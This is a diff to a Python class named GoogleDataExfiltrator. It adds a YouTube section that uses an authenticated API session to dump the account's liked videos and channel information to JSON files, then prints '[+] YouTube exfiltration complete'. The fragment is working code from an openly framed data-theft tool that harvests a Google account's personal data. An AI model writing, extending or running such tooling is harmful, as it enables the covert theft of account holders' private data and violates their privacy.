@@ -770,3 +770,23 @@ class GoogleDataExfiltrator:
                 
                 if not page_token:
                     break
+            
+            with open(youtube_dir / 'liked_videos.json', 'w') as f:
+                json.dump(liked_videos, f, indent=2)
+            print(f"[+] Retrieved {len(liked_videos)} liked videos")
+            
+            # Get channel info
+            print("[+] Retrieving channel information...")
+            channel_results = self.services['youtube'].channels().list(
+                part='snippet,contentDetails,statistics',
+                mine=True
+            ).execute()
+            
+            with open(youtube_dir / 'channel_info.json', 'w') as f:
+                json.dump(channel_results, f, indent=2)
+            print(f"[+] Retrieved channel information")
+            
+            print(f"[+] YouTube exfiltration complete")
+            
+        except Exception as e:
+            print(f"[-] Error in YouTube exfiltration: {e}")
